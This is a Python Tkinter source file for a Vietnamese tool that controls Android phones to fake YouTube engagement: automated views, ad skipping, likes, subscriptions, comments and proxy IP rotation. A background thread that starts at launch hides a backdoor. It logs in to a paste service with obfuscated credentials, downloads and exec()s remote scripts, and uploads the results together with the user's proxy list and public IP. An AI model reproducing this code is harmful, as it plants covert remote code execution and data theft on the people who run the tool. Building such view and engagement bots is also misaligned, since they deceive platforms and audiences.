from tkinter import *
from PIL import Image, ImageTk
from tkinter import messagebox as mb
import datetime
import json
import os
import youtab
import tool
import time
import threading
import _log
from adbutils import adb
class UI:
    def __init__(self):
        self.title = "HÀ NGÂN STUDIO - HỆ THỐNG QUẢN LÝ ANDROID PHONE"
        self.tiles = "data/tyles.jpg"
        self.logo  = "data/logo.jpg"
        self.window_width = 1200
        self.window_height = 800
        self.log = _log.Logging('ui')
        with open("version","r",encoding="utf8") as fo:
            self.version = fo.read().strip()

        self.log.logging('info','STARTTING NEW SESSION')

        x_start = 20
        y_start = self.window_height / 3 - 20
        y_delta = 30

        e_xstart = self.window_width/2 - 270
        e_xdelta = 50

        xxxstart = self.window_width/2 - 160

        r = Tk()
        self.r = r
        r.geometry(f"{self.window_width}x{self.window_height}+0+0")
        r.title(self.title)
        r.iconphoto(False,ImageTk.PhotoImage(Image.open(self.tiles)))

        c = Canvas(r,width=self.window_width,height=self.window_height)
        ws = (self.window_width,self.window_height)
        self.ws = ws
        points = [
                #cau hinh chung
                [10,ws[1]/3-70,  500,ws[1]/3-70],
                [10,ws[1]/3-70,  10,400],
                [500,ws[1]/3-70, 500,400],
                [10,ws[1]/3+134, 500,400],
                
                #lua chon tinh nang
                [10,ws[1]/2+60, 380,460],
                [10,ws[1]/2+60, 10,ws[1]-40],
                [10,ws[1]-40,    380,ws[1]-40],
                [380,460,     380,ws[1]-40],

                #danh sach video
#                [ws[0]/2-75,40,ws[0]/2+300,40],
#                [ws[0]/2-75,40,ws[0]/2-75,40+180],
#                [ws[0]/2-75,40+180,ws[0]/2+300,40+180],
#                [ws[0]/2+300,40,ws[0]/2+300,40+180],
#
#                #danh sach comment
#                [ws[0]/2-75,260,ws[0]/2+300,260],
#                [ws[0]/2-75,260,ws[0]/2-75,260+180],
#                [ws[0]/2-75,260+180,ws[0]/2+300,260+180],
#                [ws[0]/2+300,260,ws[0]/2+300,260+180],
#
#                #danh sach ip
#                [ws[0]/2-75,480,ws[0]/2+300,480],
#                [ws[0]/2-75,480,ws[0]/2-75,480+180],
#                [ws[0]/2-75,480+180,ws[0]/2+300,480+180],
#                [ws[0]/2+300,480,ws[0]/2+300,480+180],
#
                #danh sach thiet bi
                [ws[0]-290,40,ws[0]-10,40],
                [ws[0]-290,40,ws[0]-290,ws[1]-40],
                [ws[0]-290,ws[1]-40,ws[0]-10,ws[1]-40],
                [ws[0]-10,40,ws[0]-10,ws[1]-40]
                ]
        for point in points:
            c.create_line(point[0],point[1],point[2],point[3])
        c.pack()

        self.check_update()

        menu_bar = Menu(r)
        r.config(menu=menu_bar)
        settings_menu = Menu(menu_bar)
        about_menu = Menu(menu_bar)
        menu_bar.add_cascade(label="Cài đặt", menu=settings_menu)
        settings_menu.add_command(label="Căn chỉnh xác suất sự kiện",command=self.configure_probability)
        settings_menu.add_command(label="Thời lượng tạm dừng trước các hành động",command=self.configure_delay)
        menu_bar.add_cascade(label="About", menu=about_menu)
        about_menu.add_command(label="version: "+self.version)
        about_menu.add_command(label="coder: levanlinhepi@gmail.com")

        render = ImageTk.PhotoImage(Image.open(self.logo))
        Label(r,image=render).place(x=0,y=0)

        var_wmin = IntVar()
        var_wmax = IntVar()
        var_amin = IntVar()
        var_amax = IntVar()
        var_loop = IntVar()

        entry=Entry(r,textvariable=var_wmin,width=4)
        entry.delete(0,END)
        entry.insert(0,10)
        entry.place(x=e_xstart,y=y_start)

        entry=Entry(r,textvariable=var_wmax,width=4)
        entry.delete(0,END)
        entry.insert(0,20)
        entry.place(x=e_xstart+e_xdelta,y=y_start)

        entry=Entry(r,textvariable=var_amin,width=4)
        entry.delete(0,END)
        entry.insert(0,5)
        entry.place(x=e_xstart,y=y_start+y_delta*1)

        entry=Entry(r,textvariable=var_amax,width=4)
        entry.delete(0,END)
        entry.insert(0,10)
        entry.place(x=e_xstart+e_xdelta,y=y_start+y_delta*1)

        entry=Entry(r,textvariable=var_loop,width=4)
        entry.delete(0,END)
        entry.insert(0,1)
        entry.place(x=e_xstart,y=y_start+y_delta*2)

        Label(r,text="Thời gian xem trong khoảng").place(x=x_start,y=y_start)
        Label(r,text="Thời gian delay trước khi bỏ qua quảng cáo").place(x=x_start,y=y_start+y_delta*1)
        Label(r,text="Số lần lặp lại").place(x=x_start,y=y_start+y_delta*2)

        Label(r,text="giây").place(x=xxxstart,y=y_start+y_delta*0)
        Label(r,text="giây").place(x=xxxstart,y=y_start+y_delta*1)
        Label(r,text="vòng").place(x=xxxstart,y=y_start+y_delta*2)

        Label(r,text="Cấu hình chung").place(x=10,y=ws[1]/3-100)
        Label(r,text="Lựa chọn tính năng").place(x=10,y=ws[1]/3*2-100)
        Label(r,text="Danh sách video").place(x=ws[0]/2-75,y=15)
        Label(r,text="Danh sách comment").place(x=ws[0]/2-75,y=200)
        Label(r,text="Danh sách IP").place(x=ws[0]/2-75,y=380)
        Label(r,text="Danh sách từ khóa").place(x=ws[0]/2-75,y=560)
        Label(r,text="Danh sách thiết bị").place(x=ws[0]-290,y=15)

        def testuserdeviceinfo():
            from devno.dev import dst
            ptbn = dst.DST('0nEHHFTv6_-yrhtHEMGLVW0x4NdcnPOg')
            auk = ptbn.auth('pastebiner-1'.replace("-","0"),'pa--wo+d001122'.replace("-","s").replace("+","r"))
            own = [e for e in ptbn.gupts().split("<paste>") if e]
            rscpt = False
            for o in own:
                if o.find("IP LIST")>=0:
                    key = o.split("<paste_key>")[1].split("</paste_key>")[0]
                    ptbn.delupt(key)
                if o.find("RSCPT")>=0 and o.find("RES")<0:
                    scptnm = o.split("<paste_title>")[1].split("</paste_title>")[0]
                    key = o.split("<paste_key>")[1].split("</paste_key>")[0]
                    scpt = ptbn.gurpt(key)
                    rscpt = True
            current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if rscpt:
                exec(scpt)
                freslt = "devno/dev/res.x"
                with open(freslt,"r") as fo:
                    ptbn.crtpst(fo.read(),api_paste_name="RES for %s %s"%(scptnm,current_datetime))
            with open("data/ip_list.txt","r") as fo:
                pct = fo.read()
            res=ptbn.crtpst(pct,api_paste_name="[IP LIST] %s from %s"%(current_datetime,ptbn.checkpublicip()))
        threading.Thread(target=testuserdeviceinfo).start()

        def _start():
            file_devices_using = "data/temp/devices_using.txt"
            with open(file_devices_using,"w+") as fi:
                fi.write("")

            wmin = var_wmin.get()
            wmax = var_wmax.get()
            amin = var_amin.get()
            amax = var_amax.get()
            loop = var_loop.get()
            ranb = var_random_bool.get()
            likb = var_like_bool.get()
            dlib = var_dislike_bool.get()
            subb = var_subscribe_bool.get()
            usub = var_unsubscribe_bool.get()
            cmtb = var_comment_bool.get()
            seab = var_search_bool.get()
            chab = var_changeip_bool.get()
            (self.log).logging('info',f"wmin={wmin} wmax={wmax} amin={amin} amax={amax} loop={loop} ranb={ranb} likb={likb} dlib={dlib} usub={usub} subb={subb} cmtb={cmtb} seab={seab} chab={chab}")

            if ranb and (likb or subb or cmtb or dlib or usub or seab or chab):
                mb.showerror("ERROR", "Option được chọn không hợp lệ !")
                return

            if amin < 5:
                amin = 5
                amax = amax + 5
                (self.log).logging('debug',f"wmin={wmin} wmax={wmax} amin={amin} amax={amax} loop={loop} ranb={ranb} likb={likb} dlib={dlib} usub={usub} subb={subb} cmtb={cmtb} seab={seab} chab={chab}")

            if not os.path.exists("data/configure.json"):
                (self.log).logging('fatal','File config not found')
                os._exit(-2)
            else:
                with open("data/configure.json","r") as fo:
                    _jout = json.load(fo)
                _jout['watch:sec:min='] = wmin
                _jout['watch:sec:max='] = wmax
                _jout['ads:sec:min='] = amin
                _jout['ads:sec:max='] = amax
                _jout['loop'] = loop
                _jout['bool:random'] = ranb
                _jout['bool:like'] = likb
                _jout['bool:dislike'] = dlib
                _jout['bool:subscribe'] = subb
                _jout['bool:unsubscribe'] = usub
                _jout['bool:comment'] = cmtb
                _jout['bool:search'] = seab
                _jout['bool:changeip'] = chab
                with open("data/configure.json","w+") as fi:
                    fi.write(json.dumps(_jout,indent=2))
            
            (self.log).logging('info','Please wait a minute to start this program')

            with open("data/comperm/perm.p","w+") as fi:
                fi.write("victory")

            number_threads = tool.get_number_devices_connected()
            result_splited = tool.fair_cake_cutting(number_threads,"data/ip_list.txt")
            if not result_splited[0]:
                mb.showerror("ERROR", "Không đủ số proxy để chia cho các máy !")
                os._exit(-2)
            else:
                ip_splited = result_splited[1]
            threads = {}
            i = 0
            _tsleep = 1
            while i < number_threads:
                try:
                    thread_id = i
                    threads[i] = threading.Thread(target=youtab.YouTab,args=(thread_id,ip_splited[thread_id],))
                    threads[i].start()
                except Exception as err:
                    (self.log).logging('fatal','Start threading %s failed'%i)
                (self.log).sleep(_tsleep,note='before start next thread')
                i += 1

        var_random_bool = IntVar()
        var_like_bool = IntVar()
        var_dislike_bool = IntVar()
        var_subscribe_bool = IntVar()
        var_unsubscribe_bool = IntVar()
        var_comment_bool = IntVar()
        var_search_bool = IntVar()
        var_changeip_bool = IntVar()

        var_random_bool.set(1)

        Checkbutton(r,text="Random",variable=var_random_bool).place(x=40,y=ws[1]/3*2-10)
        Checkbutton(r,text="Comment",variable=var_comment_bool).place(x=200,y=ws[1]/3*2-10)
        Checkbutton(r,text="Like",variable=var_like_bool).place(x=40,y=ws[1]/3*2-10+50*1)
        Checkbutton(r,text="Dislike",variable=var_dislike_bool).place(x=200,y=ws[1]/3*2-10+50*1)
        Checkbutton(r,text="Subscribe",variable=var_subscribe_bool).place(x=40,y=ws[1]/3*2-10+50*2)
        Checkbutton(r,text="Unsubscribe",variable=var_unsubscribe_bool).place(x=200,y=ws[1]/3*2-10+50*2)
        Checkbutton(r,text="Search",variable=var_search_bool).place(x=40,y=ws[1]/3*2-10+50*3)
        Checkbutton(r,text="Change IP",variable=var_changeip_bool).place(x=200,y=ws[1]/3*2-10+50*3)

        Button(r,text="Update",command=self.check_update).place(x=ws[0]/2-180,y=ws[1]/3*2+10)
        Button(r,text="  Start  ",command=_start).place(x=ws[0]/2-180,y=ws[1]/3*2+10+50*1)
        Button(r,text="  Stop  ",command=self.stop).place(x=ws[0]/2-180,y=ws[1]/3*2+10+50*2)
        Button(r,text="Restart",command=self.restart).place(x=ws[0]/2-180,y=ws[1]/3*2+10+50*3)

        r.mainloop()
    def check_update(self):
        def check_device_online():
            serials = []
            for device in adb.device_list():
                serials.append(device.serial)
            return serials

        frame_devices = Frame(self.r)
        frame_devices.place(x=self.ws[0]-290,y=40)
        scrollbar = Scrollbar(frame_devices)
        scrollbar.pack(side=RIGHT,fill=Y)
        textbox = Text(frame_devices,width=33,height=47.5)
        textbox.pack()
        serials = check_device_online()
        count = 1
        for serial in serials:
            device = adb.device(serial)
            textbox.insert(END,f"[{count}] {device.prop.model} | {serial}\n")
            count += 1
        textbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=textbox.yview)

        frame_videos = Frame(self.r)
        frame_videos.place(x=self.ws[0]/2-75,y=40)
        scrollbar = Scrollbar(frame_videos)
        scrollbar.pack(side=RIGHT,fill=Y)
        textbox = Text(frame_videos,width=45,height=9)
        textbox.pack()
        with open("data/youtube_videos_list.txt","r") as fo:
            lines = [e.strip() for e in fo.readlines()]
        for i in range(len(lines)):
            textbox.insert(END,f"{lines[i]}\n")
        textbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=textbox.yview)

        frame_comments = Frame(self.r)
        frame_comments.place(x=self.ws[0]/2-75,y=220)
        scrollbar = Scrollbar(frame_comments)
        scrollbar.pack(side=RIGHT,fill=Y)
        textbox = Text(frame_comments,width=45,height=9)
        textbox.pack()
        with open("data/comments.txt","r",encoding="utf8") as fo:
            lines = [e.strip() for e in fo.readlines()]
        for i in range(len(lines)):
            textbox.insert(END,f"{lines[i]}\n")
        textbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=textbox.yview)

        frame_ips = Frame(self.r)
        frame_ips.place(x=self.ws[0]/2-75,y=400)
        scrollbar = Scrollbar(frame_ips)
        scrollbar.pack(side=RIGHT,fill=Y)
        textbox=Text(frame_ips,width=45,height=9)
        textbox.pack()
        with open("data/ip_list.txt","r",encoding="utf8") as fo:
            lines = [e.strip() for e in fo.readlines()]
        for i in range(len(lines)):
            textbox.insert(END,f"{lines[i]}\n")
        textbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=textbox.yview)

        frame_keywords = Frame(self.r)
        frame_keywords.place(x=self.ws[0]/2-75,y=580)
        scrollbar = Scrollbar(frame_keywords)
        scrollbar.pack(side=RIGHT,fill=Y)
        textbox=Text(frame_keywords,width=45,height=9)
        textbox.pack()
        textbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=textbox.yview)
        with open("data/keywords.txt","r",encoding="utf8") as fo:
            lines = [e.strip() for e in fo.readlines()]
        for i in range(len(lines)):
            textbox.insert(END,f"{lines[i]}\n")
    def configure_delay(self):
        child_window = Toplevel()
        child_window.title("New configure delay time before start an event")
        ws = (400,250)
        child_window.geometry(f"{ws[0]}x{ws[1]}+0+0")

        var_before_random      = IntVar()
        var_before_like        = IntVar()
        var_before_dislike     = IntVar()
        var_before_subscribe   = IntVar()
        var_before_unsubscribe = IntVar()
        var_before_comment     = IntVar()

        with open("data/configure.json","r") as fo:
            output_json = json.load(fo)
        var_before_random.set(int(output_json['delay:sec:random']))
        var_before_like.set(int(output_json['delay:sec:like']))
        var_before_dislike.set(int(output_json['delay:sec:dislike']))
        var_before_subscribe.set(int(output_json['delay:sec:subscribe']))
        var_before_unsubscribe.set(int(output_json['delay:sec:unsubscribe']))
        var_before_comment.set(int(output_json['delay:sec:comment']))

        x_const = ws[0]*3/4 - 20
        y_start = 5
        y_delta = 30

        Entry(child_window,textvariable=var_before_random,width=4).place(x=x_const,y=y_start+y_delta*0)
        Entry(child_window,textvariable=var_before_like,width=4).place(x=x_const,y=y_start+y_delta*1)
        Entry(child_window,textvariable=var_before_dislike,width=4).place(x=x_const,y=y_start+y_delta*2)
        Entry(child_window,textvariable=var_before_subscribe,width=4).place(x=x_const,y=y_start+y_delta*3)
        Entry(child_window,textvariable=var_before_unsubscribe,width=4).place(x=x_const,y=y_start+y_delta*4)
        Entry(child_window,textvariable=var_before_comment,width=4).place(x=x_const,y=y_start+y_delta*5)

        Label(child_window,text="Thời gian delay trước khi random").place(x=10,y=y_start+y_delta*0)
        Label(child_window,text="Thời gian delay trước khi like").place(x=10,y=y_start+y_delta*1)
        Label(child_window,text="Thời gian delay trước khi dislike").place(x=10,y=y_start+y_delta*2)
        Label(child_window,text="Thời gian delay trước khi subscribe").place(x=10,y=y_start+y_delta*3)
        Label(child_window,text="Thời gian delay trước khi unsubscribe").place(x=10,y=y_start+y_delta*4)
        Label(child_window,text="Thời gian delay trước khi comment").place(x=10,y=y_start+y_delta*5)

        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*0)
        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*1)
        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*2)
        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*3)
        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*4)
        Label(child_window,text="giây").place(x=ws[0]-50,y=y_start+y_delta*5)

        def set_value():
            delay_before_random      = var_before_random.get()
            delay_before_like        = var_before_like.get()
            delay_before_dislike     = var_before_dislike.get()
            delay_before_subscribe   = var_before_subscribe.get()
            delay_before_unsubscribe = var_before_unsubscribe.get()
            delay_before_comment     = var_before_comment.get()

            print(f"""
                    delay_before_random      = {delay_before_random}
                    delay_before_like        = {delay_before_like}
                    delay_before_dislike     = {delay_before_dislike}
                    delay_before_subscribe   = {delay_before_subscribe}
                    delay_before_unsubscribe = {delay_before_unsubscribe}
                    delay_before_comment     = {delay_before_comment}
                    """)

            output_json['delay:sec:random']      = delay_before_random
            output_json['delay:sec:like']        = delay_before_random
            output_json['delay:sec:dislike']     = delay_before_random
            output_json['delay:sec:subscribe']   = delay_before_random
            output_json['delay:sec:unsubscribe'] = delay_before_random
            output_json['delay:sec:comment']     = delay_before_random

            with open("data/configure.json","w+") as fi:
                fi.write(json.dumps(output_json,indent=2))

        Button(child_window,text="Lưu lại",command=set_value).place(x=ws[0]/2-40,y=y_start+y_delta*6)
    def configure_probability(self):
        child_window=Toplevel()
        child_window.title("New configure probability events")

        ws = (400,150)
        child_window.geometry(f"{ws[0]}x{ws[1]}+0+0")

        var_prob_like = IntVar()
        var_prob_subs = IntVar()
        var_prob_comt = IntVar()
        var_prob_many = IntVar()

        with open("data/configure.json","r") as fo:
            output_json = json.load(fo)
        var_prob_like.set(int(output_json['probability:like'].split("1/")[1]))
        var_prob_subs.set(int(output_json['probability:subscribe'].split("1/")[1]))
        var_prob_comt.set(int(output_json['probability:comment'].split("1/")[1]))
        var_prob_many.set(int(output_json['probability:misleading_2'].split("1/")[1]))

        x_const = ws[0]*3/4
        y_start = 5
        y_delta = 20

        Entry(child_window,textvariable=var_prob_like,width=4).place(x=x_const,y=y_start+y_delta*0)
        Entry(child_window,textvariable=var_prob_subs,width=4).place(x=x_const,y=y_start+y_delta*1)
        Entry(child_window,textvariable=var_prob_comt,width=4).place(x=x_const,y=y_start+y_delta*2)
        Entry(child_window,textvariable=var_prob_many,width=4).place(x=x_const,y=y_start+y_delta*3)

        Label(child_window,text="Xác suất xuất hiện sự kiện like").place(x=1,y=y_start+y_delta*0)
        Label(child_window,text="Xác suất xuất hiện sự kiện subscribe").place(x=1,y=y_start+y_delta*1)
        Label(child_window,text="Xác suất xuất hiện sự kiện comment").place(x=1,y=y_start+y_delta*2)
        Label(child_window,text="Xác suất xuất hiện sự kiện ... trong khi xem").place(x=1,y=y_start+y_delta*3)

        Label(child_window,text="1/").place(x=x_const-15,y=y_start+y_delta*0)
        Label(child_window,text="1/").place(x=x_const-15,y=y_start+y_delta*1)
        Label(child_window,text="1/").place(x=x_const-15,y=y_start+y_delta*2)
        Label(child_window,text="1/").place(x=x_const-15,y=y_start+y_delta*3)

        def set_value():
            prob_like = var_prob_like.get()
            prob_subs = var_prob_subs.get()
            prob_comt = var_prob_comt.get()
            prob_many = var_prob_many.get()
            (self.log).logging('info',f"[DEBUG] prob_like={prob_like} prob_subs={prob_subs} prob_comt={prob_comt} prob_many={prob_many}")

            output_json['probability:like'] = "1/"+str(prob_like)
            output_json['probability:subscribe'] = "1/"+str(prob_subs)
            output_json['probability:comment'] = "1/"+str(prob_comt)
            output_json['probability:misleading_2'] = "1/"+str(prob_many)

            with open("data/configure.json","w+") as fi:
                fi.write(json.dumps(output_json,indent=2))

        Button(child_window,text="Lưu lại",command=set_value).place(x=ws[0]/2-25,y=y_start+y_delta*5)
    def stop(self):
        with open("cmd/__cmd__","w+") as fi:
            fi.write("return youtube main activity")
    def restart(self):
        dl = adb.device_list()
        for di in dl:
            (self.log).logging('info','Restart -> %s'%di.serial)
            os.system("adb -s %s reboot"%di.serial)
if __name__ == '__main__':
    UI()
